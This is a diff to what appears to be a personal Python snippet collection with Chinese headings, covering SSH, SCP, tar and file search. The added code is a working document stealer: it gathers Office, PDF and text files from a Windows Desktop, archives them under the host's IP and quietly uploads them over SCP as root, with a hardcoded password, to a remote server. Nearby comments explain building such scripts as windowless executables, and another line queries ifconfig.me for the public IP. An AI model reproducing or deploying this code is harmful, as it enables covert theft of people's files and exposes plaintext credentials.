@@ -8,7 +8,18 @@ def get_code(xx):
         c=random.randint(0,61)
         b+=a[c]
    return b   
+   
+#####################  ###-----------------        python打包为tar包        ---------###########
+ tar=tarfile.open("a.tar.gz","w:gz")
+    for i in file:
+        tar.add(i)
+    tar.close()  
+#####################  ###-----------------        获取系统命令返回值         ---------###########
+import subprocess
+(a,b)=subprocess.getstatusoutput("curl -Ss ifconfig.me")
+
 ##########################---------------         遍历目录查找文件    ---------#############
+
 def search(dir,fil):
     os.chdir(dir)
     it = os.listdir()
@@ -19,7 +30,7 @@ def search(dir,fil):
             os.chdir(os.pardir)
         elif fil in pa.split("/")[-1] :
             print(pa)
-##########################-----------------         ssh 密钥认证,scp上传下载            ---------################
+##########################-----------------         ssh 密钥认证           ---------################
 #公钥打包exe程序需要添加 --key id_rsa参数  pyinstaller -F -w --key id_rsa .py      
 import paramiko
 client = paramiko.SSHClient()
@@ -31,7 +42,8 @@ stdin, stdout, stderr = client.exec_command('ls')
 a,b=stdout.read(),stderr.read() 		 #获取执行结果   
 result= a if a else b       
 print(result.decode())
-#------------------------------------------------------------------------
+#--------------------------------------------       scp上传下载            ---------################
+import paramiko
 s=paramiko.Transport(("192.168.116.200",22))
 s.connect(username='root',password='xiaoxue')
 sftp=paramiko.SFTPClient.from_transport(s)
@@ -128,28 +140,40 @@ a.execute('select time  from {} where ip="{}";'.format(abrr,who))           #查
 print(a.fetchall())
 
 #################################-----------------        检索文件远程发送         ---------###########
-
-import os,easygui,paramiko
+import os,paramiko,time,tarfile,easygui,threading,socket
 from scp import SCPClient
-def SCP(Ip,file):          #上传文件
-    os.chdir("C:\\Users\\Administrator\\xiaoxue")
+def SCP(file):
     ssh=paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    ssh.connect(hostname="192.168.116.200",port=22,username='root',password="xiaoxue")
+    ssh.connect(hostname="192.168.116.200", port=22, username='root', password="xiaoxue")
     scp=SCPClient(ssh.get_transport(),socket_timeout=15.0)
-    scp.put(file, "/mnt/")
-def search(dir,fil):
+    tar=tarfile.open(tarn,"w:gz")
+    for i in file:
+        tar.add(i)
+    tar.close()
+    scp.put(tarn,"/mnt")
+    scp.close()
+wenjian = []
+def search(dir):
+    global wenjian
+    jiewei=['doc','docx','xls','xlsx','txt','pdf']
     os.chdir(dir)
     it = os.listdir()
-    aww=[ ]
     for i in it:
         pa = os.path.join(dir,i)
         if os.path.isdir(pa):
-            search(pa,fil)
+            search(pa)
             os.chdir(os.pardir)
-        elif fil in pa.split("/")[-1] :
-            b=repr(pa)
-            SCP("192.168.116.200",pa)
-search("C:\\Users\\Administrator\\Desktop","xlsx")
-search("C:\\Users\\Administrator\\Desktop","txt")
-    
+        else:
+            for i in jiewei:
+                if i in pa.split("\\")[-1]:
+                  wenjian.append(pa)
+if __name__=="__main__":
+  try:
+    a=time.time()
+    tarn = socket.gethostbyname(socket.gethostname()) + ".tar.gz"
+    search("C:\\Users\\Administrator\\Desktop")
+    threading.Thread(target=SCP,args=(wenjian,)).start()
+    print("okay..........................",time.time()-a)
+  except  Exception as f :
+      easygui.msgbox(str(f),'linux')
